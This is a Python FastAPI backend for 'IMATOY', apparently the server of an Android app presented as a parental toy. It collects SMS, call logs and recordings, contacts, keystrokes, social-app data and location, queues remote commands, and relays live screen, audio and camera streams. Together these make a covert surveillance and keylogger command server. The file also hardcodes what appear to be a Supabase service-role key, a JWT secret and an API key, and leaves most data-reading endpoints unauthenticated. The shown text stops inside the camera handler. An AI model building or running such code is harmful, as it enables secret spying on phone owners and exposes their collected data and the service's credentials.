#!/usr/bin/env python3
"""
IMATOY Backend Server — Python/FastAPI + Supabase
Render.com pe host karo — single file, sab kuch isme hai
Database: Supabase (PostgreSQL) — tables already bani hain
Realtime: Supabase Realtime (Flutter app directly connect karta hai)

Deploy on Render.com:
  Build Command: pip install -r requirements.txt
  Start Command: python server.py
  Environment Variables: (neeche dekho)
"""

import os, uuid, json, base64, asyncio
from datetime import datetime, timedelta
from typing import Optional, List, Any, Dict, Set
from pathlib import Path

import uvicorn
import httpx
from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File, Form, Depends, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from jose import jwt, JWTError

# ═══════════════════════════════════════════════════════════════════
# CONFIG — Render.com pe Environment Variables set karo
# ═══════════════════════════════════════════════════════════════════
SUPABASE_URL      = "https://owfiiqyimnxalgissulj.supabase.co"
SUPABASE_KEY      = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93ZmlpcXlpbW54YWxnaXNzdWxqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MjUzNjU5MywiZXhwIjoyMDg4MTEyNTkzfQ.WCOG2gE5AJXeS4pvUrbOd63t9GKyh8K-swHUe4WxBQY"
JWT_SECRET        = "imatoy_super_secret_jwt_key_2024_xK9mP3nQ7rL2vB8"
AUTO_REGISTER_KEY = "imatoy_auto_register_secret_2024"
JWT_EXPIRE_DAYS   = 30
PORT              = int(os.getenv("PORT", "10000"))   # Render PORT env var zaruri hai
UPLOAD_DIR        = "/tmp/imatoy_uploads"
ALGORITHM         = "HS256"

# Metered.ca TURN Server (WebRTC ke liye)
METERED_API_KEY   = "zYgB3VGSmsAw470kDmr-yt4oyngLEyVXDT7d2mF97POUDiwr"
METERED_DOMAIN    = "imatoy.metered.live"

# Upload directories
for d in ["media", "screenshots", "audio", "recordings"]:
    Path(f"{UPLOAD_DIR}/{d}").mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════
# SUPABASE REST API HELPERS
# ═══════════════════════════════════════════════════════════════════
SB_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation",
}

async def sb_get(table: str, params: dict = {}) -> list:
    """Supabase se data fetch karo"""
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, params=params, timeout=15
        )
        data = r.json()
        return data if isinstance(data, list) else []

async def sb_get_one(table: str, params: dict = {}) -> Optional[dict]:
    """Supabase se ek record fetch karo"""
    params["limit"] = 1
    rows = await sb_get(table, params)
    return rows[0] if rows else None

async def sb_insert(table: str, data: dict) -> Optional[dict]:
    """Supabase mein insert karo"""
    async with httpx.AsyncClient() as client:
        r = await client.post(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, json=data, timeout=15
        )
        result = r.json()
        if isinstance(result, list) and result:
            return result[0]
        return data

async def sb_update(table: str, match: dict, data: dict) -> None:
    """Supabase mein update karo"""
    params = {k: f"eq.{v}" for k, v in match.items()}
    async with httpx.AsyncClient() as client:
        await client.patch(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, params=params, json=data, timeout=15
        )

async def sb_count(table: str, params: dict = {}) -> int:
    """Supabase mein count karo — Content-Range header se"""
    p = {k: v for k, v in params.items() if k != "select"}
    p["select"] = "*"
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers={**SB_HEADERS, "Prefer": "count=exact"},
            params={**p, "limit": 1},
            timeout=15
        )
        try:
            cr = r.headers.get("content-range", "")
            if "/" in cr:
                total = cr.split("/")[-1]
                return int(total) if total != "*" else 0
            return 0
        except:
            return 0

# ═══════════════════════════════════════════════════════════════════
# JWT HELPERS
# ═══════════════════════════════════════════════════════════════════
def create_jwt(payload: dict, expire_days: int = JWT_EXPIRE_DAYS) -> str:
    data = payload.copy()
    data["exp"] = datetime.utcnow() + timedelta(days=expire_days)
    data["iat"] = datetime.utcnow()
    return jwt.encode(data, JWT_SECRET, algorithm=ALGORITHM)

def verify_jwt(token: str) -> Optional[dict]:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[ALGORITHM])
    except JWTError:
        return None

async def get_device_id(authorization: str = Header(None)) -> str:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Unauthorized")
    payload = verify_jwt(authorization[7:])
    if not payload or "deviceId" not in payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    return payload["deviceId"]

# ═══════════════════════════════════════════════════════════════════
# FASTAPI APP
# ═══════════════════════════════════════════════════════════════════
app = FastAPI(title="IMATOY Backend", version="2.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def ok(data=None, **kwargs):
    return {"success": True, **({"data": data} if data is not None else {}), **kwargs}

def err(msg: str, code: int = 400):
    raise HTTPException(status_code=code, detail={"success": False, "message": msg})

def now_iso() -> str:
    return datetime.utcnow().isoformat()

def make_id() -> str:
    return str(uuid.uuid4())

# ═══════════════════════════════════════════════════════════════════
# PYDANTIC MODELS
# ═══════════════════════════════════════════════════════════════════
class AutoRegisterBody(BaseModel):
    deviceInfo: Optional[dict] = {}
    deviceId: Optional[str] = None
    deviceName: Optional[str] = None
    model: Optional[str] = None
    manufacturer: Optional[str] = None
    androidVersion: Optional[str] = None
    appVersion: Optional[str] = None

class RefreshTokenBody(BaseModel):
    refreshToken: str

class SmsBody(BaseModel):
    smsList: Optional[List[dict]] = None
    childId: Optional[str] = None

class CallBody(BaseModel):
    callList: Optional[List[dict]] = None
    childId: Optional[str] = None

class ContactBody(BaseModel):
    contacts: Optional[List[dict]] = None
    childId: Optional[str] = None

class KeylogBody(BaseModel):
    logs: Optional[List[dict]] = None
    childId: Optional[str] = None

class SocialBody(BaseModel):
    appPackage: Optional[str] = None
    appName: Optional[str] = None
    childId: Optional[str] = None

class DeviceInfoBody(BaseModel):
    batteryLevel: Optional[int] = None
    isCharging: Optional[bool] = None
    wifiSsid: Optional[str] = None
    ipAddress: Optional[str] = None
    locationLat: Optional[float] = None
    locationLng: Optional[float] = None

class CommandBody(BaseModel):
    deviceId: str
    command: str
    params: Optional[dict] = {}

class CommandResultBody(BaseModel):
    result: Any = None

class ScreenUploadBody(BaseModel):
    data: str  # base64
    deviceId: Optional[str] = None

class MediaBase64Body(BaseModel):
    data: str  # base64
    fileName: Optional[str] = "file.jpg"
    fileType: Optional[str] = "image/jpeg"

# ═══════════════════════════════════════════════════════════════════
# ROUTES: Health
# ═══════════════════════════════════════════════════════════════════
@app.get("/")
@app.get("/health")
@app.get("/api/health")
async def health():
    cnt = await sb_count("devices")
    return ok(message="🧸 IMATOY Python Backend Running",
              version="2.0.0", db="supabase",
              timestamp=now_iso(), registered_devices=cnt)

# ═══════════════════════════════════════════════════════════════════
# ROUTES: AUTH
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/auth/auto-register")
async def auto_register(body: AutoRegisterBody, request: Request):
    key = request.headers.get("x-auto-register-key", "")
    if key != AUTO_REGISTER_KEY:
        err("Invalid auto-register key", 403)

    info = body.deviceInfo or {}
    device_id    = info.get("deviceId")    or body.deviceId    or make_id()
    device_name  = info.get("deviceName")  or body.deviceName  or "Unknown Device"
    model        = info.get("model") or info.get("deviceModel") or body.model or "Unknown"
    manufacturer = info.get("manufacturer") or body.manufacturer or "Unknown"
    android_ver  = info.get("androidVersion") or body.androidVersion or "Unknown"
    app_version  = info.get("appVersion")  or body.appVersion  or "1.0.0"

    existing = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if existing:
        token   = create_jwt({"deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})
        refresh = create_jwt({"deviceId": device_id, "type": "refresh"}, 90)
        await sb_update("devices", {"device_id": device_id}, {
            "last_seen": now_iso(), "token": token,
            "device_name": device_name, "model": model,
            "android_version": android_ver, "app_version": app_version
        })
        return ok(message="Device re-registered", data={
            "token": token, "refreshToken": refresh,
            "deviceId": device_id, "parentId": existing["parent_id"],
            "childId": existing["child_id"], "expiresIn": f"{JWT_EXPIRE_DAYS}d"
        })

    parent_id = make_id()
    child_id  = make_id()
    token     = create_jwt({"deviceId": device_id, "childId": child_id, "parentId": parent_id})
    refresh   = create_jwt({"deviceId": device_id, "type": "refresh"}, 90)

    await sb_insert("devices", {
        "id": make_id(), "device_id": device_id, "device_name": device_name,
        "model": model, "manufacturer": manufacturer, "android_version": android_ver,
        "app_version": app_version, "parent_id": parent_id, "child_id": child_id,
        "token": token, "is_active": True, "last_seen": now_iso(), "created_at": now_iso()
    })
    return ok(message="Device registered successfully", data={
        "token": token, "refreshToken": refresh,
        "deviceId": device_id, "parentId": parent_id,
        "childId": child_id, "expiresIn": f"{JWT_EXPIRE_DAYS}d"
    })

@app.post("/api/auth/pair-device")
async def pair_device(body: AutoRegisterBody):
    info = body.deviceInfo or {}
    device_id   = info.get("deviceId")   or make_id()
    device_name = info.get("deviceName") or "Unknown"
    model       = info.get("deviceModel") or info.get("model") or "Unknown"
    android_ver = info.get("androidVersion") or "Unknown"

    existing = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if existing:
        token = create_jwt({"deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})
        await sb_update("devices", {"device_id": device_id}, {"last_seen": now_iso(), "token": token})
        return ok(data={"token": token, "deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})

    parent_id = make_id(); child_id = make_id()
    token = create_jwt({"deviceId": device_id, "childId": child_id, "parentId": parent_id})
    await sb_insert("devices", {
        "id": make_id(), "device_id": device_id, "device_name": device_name,
        "model": model, "android_version": android_ver, "parent_id": parent_id,
        "child_id": child_id, "token": token, "is_active": True,
        "last_seen": now_iso(), "created_at": now_iso()
    })
    return ok(data={"token": token, "deviceId": device_id, "childId": child_id, "parentId": parent_id})

@app.post("/api/auth/refresh-token")
async def refresh_token(body: RefreshTokenBody):
    payload = verify_jwt(body.refreshToken)
    if not payload or "deviceId" not in payload:
        err("Invalid refresh token", 401)
    device = await sb_get_one("devices", {"device_id": f"eq.{payload['deviceId']}"})
    if not device:
        err("Device not found", 404)
    new_token = create_jwt({"deviceId": payload["deviceId"], "childId": device["child_id"], "parentId": device["parent_id"]})
    await sb_update("devices", {"device_id": payload["deviceId"]}, {"token": new_token, "last_seen": now_iso()})
    return ok(token=new_token, expiresIn=f"{JWT_EXPIRE_DAYS}d")

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SMS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/sms")
@app.post("/api/sms/sync")
async def upload_sms(body: SmsBody, device_id: str = Depends(get_device_id)):
    logs = body.smsList or []
    saved = 0
    for log in logs:
        if not log: continue
        await sb_insert("sms_logs", {
            "id": make_id(), "device_id": device_id,
            "address": log.get("address"), "body": log.get("body"),
            "type": log.get("type"), "date": log.get("date"),
            "thread_id": log.get("threadId"), "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/sms/{device_id}")
async def get_sms(device_id: str, limit: int = 100):
    rows = await sb_get("sms_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: CALLS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/calls")
@app.post("/api/calls/sync")
async def upload_calls(body: CallBody, device_id: str = Depends(get_device_id)):
    logs = body.callList or []
    saved = 0
    for log in logs:
        if not log: continue
        await sb_insert("call_logs", {
            "id": make_id(), "device_id": device_id,
            "number": log.get("number"), "name": log.get("name"),
            "type": log.get("type"), "duration": int(log.get("duration", 0)),
            "date": log.get("date"), "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.post("/api/calls/recording/upload")
async def upload_recording(
    recording: UploadFile = File(...),
    phoneNumber: str = Form("unknown"),
    duration: int = Form(0),
    device_id: str = Depends(get_device_id)
):
    fid = make_id()
    ext = recording.filename.rsplit(".", 1)[-1] if "." in recording.filename else "mp3"
    fname = f"rec_{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/audio/{fname}"
    content = await recording.read()
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/audio/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": fname,
        "file_path": fpath, "file_url": furl, "file_type": f"audio/{ext}",
        "file_size": len(content), "category": "recording", "created_at": now_iso()
    })
    await sb_insert("call_logs", {
        "id": make_id(), "device_id": device_id, "number": phoneNumber,
        "type": "recording", "duration": duration, "date": now_iso(), "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.get("/api/calls/{device_id}")
async def get_calls(device_id: str, limit: int = 100):
    rows = await sb_get("call_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: CONTACTS
# ═══════════════════════════════════════════════════════════════════
def normalize_to_json_array(val) -> str:
    """Koi bhi value ko JSON array string mein convert karo"""
    if isinstance(val, list):
        return json.dumps(val)
    if isinstance(val, str) and val.strip():
        # Already JSON array hai?
        stripped = val.strip()
        if stripped.startswith("["):
            try:
                parsed = json.loads(stripped)
                if isinstance(parsed, list):
                    return stripped
            except:
                pass
        # Plain string hai — array mein wrap karo
        return json.dumps([val])
    return "[]"

def parse_json_array(val) -> list:
    """JSON string ko list mein parse karo"""
    if isinstance(val, list):
        return val
    try:
        result = json.loads(val or "[]")
        if isinstance(result, list):
            return result
        return [result] if result else []
    except:
        if val and isinstance(val, str):
            return [val]
        return []

@app.post("/api/contacts")
@app.post("/api/contacts/sync")
async def upload_contacts(body: ContactBody, device_id: str = Depends(get_device_id)):
    contacts = body.contacts or []
    saved = 0
    for c in contacts:
        if not c: continue
        phones = normalize_to_json_array(c.get("phones", []))
        emails = normalize_to_json_array(c.get("emails", []))
        await sb_insert("contacts", {
            "id": make_id(), "device_id": device_id,
            "name": c.get("name"), "phones": phones,
            "emails": emails, "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/contacts/{device_id}")
async def get_contacts(device_id: str, limit: int = 500):
    rows = await sb_get("contacts", {
        "device_id": f"eq.{device_id}",
        "order": "name.asc",
        "limit": min(limit, 5000)
    })
    for r in rows:
        r["phones"] = parse_json_array(r.get("phones"))
        r["emails"] = parse_json_array(r.get("emails"))
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: MEDIA
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/media/base64")
async def upload_media_base64(body: MediaBase64Body, device_id: str = Depends(get_device_id)):
    content = base64.b64decode(body.data)
    fid = make_id()
    ext = body.fileName.rsplit(".", 1)[-1] if "." in body.fileName else "jpg"
    fname = f"{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/media/{fname}"
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/media/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": body.fileName,
        "file_path": fpath, "file_url": furl, "file_type": body.fileType,
        "file_size": len(content), "category": "media", "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.post("/api/media")
@app.post("/api/media/upload")
async def upload_media(
    file: UploadFile = File(None),
    media: UploadFile = File(None),
    fileType: str = Form("media"),
    device_id: str = Depends(get_device_id)
):
    upload = file or media
    if not upload:
        err("No file uploaded")
    fid = make_id()
    ext = upload.filename.rsplit(".", 1)[-1] if "." in upload.filename else "bin"
    subdir = "screenshots" if fileType in ["screenshot", "screenshots"] else ("audio" if fileType == "audio" else "media")
    fname = f"{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/{subdir}/{fname}"
    content = await upload.read()
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/{subdir}/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": upload.filename,
        "file_path": fpath, "file_url": furl, "file_type": upload.content_type or "application/octet-stream",
        "file_size": len(content), "category": subdir, "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.get("/api/media/{device_id}")
async def get_media(device_id: str, limit: int = 50):
    rows = await sb_get("media_files", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 500)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: KEYLOG
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/keylog")
@app.post("/api/keylog/sync")
async def upload_keylog(body: KeylogBody, device_id: str = Depends(get_device_id)):
    entries = body.logs or []
    saved = 0
    for e in entries:
        if not e: continue
        await sb_insert("keylog_entries", {
            "id": make_id(), "device_id": device_id,
            "app_package": e.get("appPackage"), "app_name": e.get("appName"),
            "text": e.get("text"), "timestamp": e.get("timestamp"),
            "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/keylog/{device_id}")
async def get_keylog(device_id: str, limit: int = 200):
    rows = await sb_get("keylog_entries", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 2000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SOCIAL
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/social")
@app.post("/api/social/sync")
async def upload_social(body: SocialBody, request: Request, device_id: str = Depends(get_device_id)):
    raw = await request.json()
    await sb_insert("social_logs", {
        "id": make_id(), "device_id": device_id,
        "app_package": body.appPackage, "app_name": body.appName,
        "data": json.dumps(raw), "created_at": now_iso()
    })
    return ok()

@app.get("/api/social/{device_id}")
async def get_social(device_id: str, limit: int = 100):
    rows = await sb_get("social_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    for r in rows:
        try: r["data"] = json.loads(r.get("data") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: DEVICE
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/device/heartbeat")
async def heartbeat(body: DeviceInfoBody, device_id: str = Depends(get_device_id)):
    await sb_update("devices", {"device_id": device_id}, {"last_seen": now_iso()})
    await sb_insert("device_info", {
        "id": make_id(), "device_id": device_id,
        "battery_level": body.batteryLevel, "is_charging": body.isCharging,
        "wifi_ssid": body.wifiSsid, "ip_address": body.ipAddress,
        "location_lat": body.locationLat, "location_lng": body.locationLng,
        "created_at": now_iso()
    })
    return ok()

@app.get("/api/device/list")
async def list_devices():
    rows = await sb_get("devices", {"order": "last_seen.desc", "limit": 200})
    # Security: token field remove karo response se
    safe_rows = []
    for r in rows:
        safe_rows.append({k: v for k, v in r.items() if k != "token"})
    return ok(data=safe_rows, count=len(safe_rows))

@app.put("/api/device/{child_id}/info")
async def update_device_info(child_id: str, body: DeviceInfoBody, device_id: str = Depends(get_device_id)):
    await sb_update("devices", {"device_id": child_id}, {"last_seen": now_iso()})
    await sb_insert("device_info", {
        "id": make_id(), "device_id": device_id,
        "battery_level": body.batteryLevel, "is_charging": body.isCharging,
        "wifi_ssid": body.wifiSsid, "ip_address": body.ipAddress,
        "location_lat": body.locationLat, "location_lng": body.locationLng,
        "created_at": now_iso()
    })
    return ok()

@app.get("/api/device/{device_id}")
async def get_device(device_id: str):
    dev = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if not dev:
        dev = await sb_get_one("devices", {"child_id": f"eq.{device_id}"})
    if not dev:
        raise HTTPException(status_code=404, detail={"success": False, "message": "Device not found"})
    # Latest device info — order by created_at desc
    info = await sb_get_one("device_info", {
        "device_id": f"eq.{dev.get('device_id', device_id)}",
        "order": "created_at.desc"
    })
    if info:
        dev["latest_info"] = info
    # Security: token field remove karo
    dev.pop("token", None)
    return ok(data=dev)

# ═══════════════════════════════════════════════════════════════════
# ROUTES: COMMANDS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/commands")
async def create_command(body: CommandBody):
    cid = make_id()
    await sb_insert("commands", {
        "id": cid, "device_id": body.deviceId, "command": body.command,
        "params": json.dumps(body.params or {}), "status": "pending",
        "created_at": now_iso()
    })
    return ok(commandId=cid, status="pending", message="Command queued")

@app.get("/api/commands/{device_id}/pending")
async def get_pending_commands(device_id: str):
    rows = await sb_get("commands", {
        "device_id": f"eq.{device_id}",
        "status": "eq.pending",
        "order": "created_at.asc",
        "limit": 20
    })
    for r in rows:
        try: r["params"] = json.loads(r.get("params") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

@app.put("/api/commands/{command_id}/result")
async def update_command_result(command_id: str, body: CommandResultBody):
    await sb_update("commands", {"id": command_id}, {
        "status": "completed",
        "result": json.dumps(body.result),
        "executed_at": now_iso()
    })
    return ok()

@app.get("/api/commands/{device_id}")
async def get_commands(device_id: str, status: str = None, limit: int = 50):
    params = {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 200)
    }
    if status:
        params["status"] = f"eq.{status}"
    rows = await sb_get("commands", params)
    for r in rows:
        try: r["params"] = json.loads(r.get("params") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SCREEN UPLOAD
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/screen/upload")
async def upload_screenshot(body: ScreenUploadBody, device_id: str = Depends(get_device_id)):
    if not body.data:
        err("No screenshot data")
    content = base64.b64decode(body.data)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fid = make_id()
    fname = f"screen_{device_id[:8]}_{ts}.jpg"
    fpath = f"{UPLOAD_DIR}/screenshots/{fname}"
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/screenshots/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": fname,
        "file_path": fpath, "file_url": furl, "file_type": "image/jpeg",
        "file_size": len(content), "category": "screenshot", "created_at": now_iso()
    })
    return ok(fileName=fname, url=furl, fileId=fid)

@app.get("/api/screen/{device_id}")
async def get_screenshots(device_id: str, limit: int = 20):
    rows = await sb_get("media_files", {
        "device_id": f"eq.{device_id}",
        "category": "eq.screenshot",
        "order": "created_at.desc",
        "limit": min(limit, 100)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: STATS
# ═══════════════════════════════════════════════════════════════════
@app.get("/api/stats/{device_id}")
async def get_stats(device_id: str):
    dev  = await sb_get_one("devices",     {"device_id": f"eq.{device_id}"})
    if not dev:
        dev = await sb_get_one("devices",  {"child_id":  f"eq.{device_id}"})
    info = await sb_get_one("device_info", {"device_id": f"eq.{device_id}"})

    sms_count     = await sb_count("sms_logs",      {"device_id": f"eq.{device_id}"})
    call_count    = await sb_count("call_logs",      {"device_id": f"eq.{device_id}"})
    contact_count = await sb_count("contacts",       {"device_id": f"eq.{device_id}"})
    media_count   = await sb_count("media_files",    {"device_id": f"eq.{device_id}"})
    keylog_count  = await sb_count("keylog_entries", {"device_id": f"eq.{device_id}"})
    social_count  = await sb_count("social_logs",    {"device_id": f"eq.{device_id}"})

    return ok(data={
        "deviceId":       device_id,
        "deviceName":     dev.get("device_name", "Unknown") if dev else "Unknown",
        "model":          dev.get("model")           if dev else None,
        "androidVersion": dev.get("android_version") if dev else None,
        "lastSeen":       dev.get("last_seen")        if dev else None,
        "isActive":       bool(dev.get("is_active"))  if dev else False,
        "smsCount":       sms_count,
        "callCount":      call_count,
        "contactCount":   contact_count,
        "mediaCount":     media_count,
        "keylogCount":    keylog_count,
        "socialCount":    social_count,
        "battery":        info.get("battery_level") if info else None,
        "isCharging":     info.get("is_charging")   if info else None,
        "wifiSsid":       info.get("wifi_ssid")     if info else None,
        "ipAddress":      info.get("ip_address")    if info else None,
        "location":       {"lat": info["location_lat"], "lng": info["location_lng"]}
                          if info and info.get("location_lat") else None,
    })

# ═══════════════════════════════════════════════════════════════════
# WEBSOCKET — LIVE STREAMING (Screen, Audio, Camera)
# ═══════════════════════════════════════════════════════════════════
# Architecture:
#   Child App  → ws://server/ws/screen/{device_id}?role=child  (sends frames)
#   Parent App → ws://server/ws/screen/{device_id}?role=parent (receives frames)
#   Server relays data between child and parent(s)
#
# WebRTC Signaling:
#   Child  → ws://server/ws/signal/{device_id}?role=child
#   Parent → ws://server/ws/signal/{device_id}?role=parent
#   Server relays offer/answer/ICE candidates

class StreamConnectionManager:
    """
    Live streaming ke liye WebSocket connection manager.
    Ek device_id ke liye ek child aur multiple parents ho sakte hain.
    """
    def __init__(self):
        # {device_id: {"child": WebSocket|None, "parents": Set[WebSocket]}}
        self.screen:  Dict[str, dict] = {}
        self.audio:   Dict[str, dict] = {}
        self.camera:  Dict[str, dict] = {}
        self.signal:  Dict[str, dict] = {}

    def _get_room(self, stream: str, device_id: str) -> dict:
        store = getattr(self, stream)
        if device_id not in store:
            store[device_id] = {"child": None, "parents": set()}
        return store[device_id]

    async def connect(self, stream: str, device_id: str, ws: WebSocket, role: str):
        await ws.accept()
        room = self._get_room(stream, device_id)
        if role == "child":
            room["child"] = ws
            print(f"📱 Child connected [{stream}] device={device_id[:8]}")
        else:
            room["parents"].add(ws)
            print(f"👁️  Parent connected [{stream}] device={device_id[:8]} total_parents={len(room['parents'])}")

    def disconnect(self, stream: str, device_id: str, ws: WebSocket, role: str):
        store = getattr(self, stream)
        if device_id not in store:
            return
        room = store[device_id]
        if role == "child" and room["child"] == ws:
            room["child"] = None
            print(f"📱 Child disconnected [{stream}] device={device_id[:8]}")
        else:
            room["parents"].discard(ws)
            print(f"👁️  Parent disconnected [{stream}] device={device_id[:8]}")

    async def relay_to_parents(self, stream: str, device_id: str, data):
        """Child se data lekar saare parents ko bhejo"""
        store = getattr(self, stream)
        if device_id not in store:
            return
        parents = store[device_id]["parents"].copy()
        dead = set()
        for parent in parents:
            try:
                if isinstance(data, bytes):
                    await parent.send_bytes(data)
                else:
                    await parent.send_text(data if isinstance(data, str) else json.dumps(data))
            except Exception:
                dead.add(parent)
        for ws in dead:
            store[device_id]["parents"].discard(ws)

    async def relay_to_child(self, stream: str, device_id: str, data):
        """Parent se command lekar child ko bhejo"""
        store = getattr(self, stream)
        if device_id not in store:
            return
        child = store[device_id].get("child")
        if child:
            try:
                if isinstance(data, bytes):
                    await child.send_bytes(data)
                else:
                    await child.send_text(data if isinstance(data, str) else json.dumps(data))
            except Exception:
                store[device_id]["child"] = None

    def get_status(self, stream: str, device_id: str) -> dict:
        store = getattr(self, stream)
        if device_id not in store:
            return {"child_connected": False, "parent_count": 0}
        room = store[device_id]
        return {
            "child_connected": room["child"] is not None,
            "parent_count": len(room["parents"])
        }

ws_manager = StreamConnectionManager()

# ─── WebSocket: Screen Streaming ────────────────────────────────────
@app.websocket("/ws/screen/{device_id}")
async def ws_screen(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
    """
    Screen streaming WebSocket.
    Child: role=child → screenshot bytes bhejta hai
    Parent: role=parent → screenshot bytes receive karta hai

    Flutter mein use karo:
      final channel = WebSocketChannel.connect(
        Uri.parse('wss://appima.onrender.com/ws/screen/$deviceId?role=child&token=$token')
      );
      channel.sink.add(screenshotBytes);  // Uint8List
    """
    await ws_manager.connect("screen", device_id, websocket, role)
    try:
        while True:
            if role == "child":
                # Child screenshot bytes bhejta hai
                data = await websocket.receive_bytes()
                # Saare parents ko relay karo
                await ws_manager.relay_to_parents("screen", device_id, data)
            else:
                # Parent commands bhej sakta hai (start/stop)
                msg = await websocket.receive_text()
                await ws_manager.relay_to_child("screen", device_id, msg)
    except WebSocketDisconnect:
        ws_manager.disconnect("screen", device_id, websocket, role)
    except Exception as e:
        print(f"Screen WS error [{device_id[:8]}]: {e}")
        ws_manager.disconnect("screen", device_id, websocket, role)

# ─── WebSocket: Audio Streaming ─────────────────────────────────────
@app.websocket("/ws/audio/{device_id}")
async def ws_audio(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
    """
    Audio streaming WebSocket.
    Child: role=child → audio chunks (PCM/AAC bytes) bhejta hai
    Parent: role=parent → audio chunks receive karta hai

    Flutter mein use karo:
      final channel = WebSocketChannel.connect(
        Uri.parse('wss://appima.onrender.com/ws/audio/$deviceId?role=child&token=$token')
      );
      // Audio recorder se chunks lo aur bhejo
      channel.sink.add(audioChunkBytes);
    """
    await ws_manager.connect("audio", device_id, websocket, role)
    try:
        while True:
            if role == "child":
                data = await websocket.receive_bytes()
                await ws_manager.relay_to_parents("audio", device_id, data)
            else:
                msg = await websocket.receive_text()
                await ws_manager.relay_to_child("audio", device_id, msg)
    except WebSocketDisconnect:
        ws_manager.disconnect("audio", device_id, websocket, role)
    except Exception as e:
        print(f"Audio WS error [{device_id[:8]}]: {e}")
        ws_manager.disconnect("audio", device_id, websocket, role)

# ─── WebSocket: Camera Streaming ────────────────────────────────────
@app.websocket("/ws/camera/{device_id}")
async def ws_camera(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
    """
    Camera streaming WebSocket.
    Child: role=child → camera frame bytes (JPEG) bhejta hai
    Parent: role=parent → camera frames receive karta hai

    Flutter mein use karo:
      final channel = WebSocketChannel.connect(
        Uri.parse('wss://appima.onrender.com/ws/camera/$deviceId?role=child&token=$token')
      );
      channel.sink.add(jpegFrameBytes);
    """
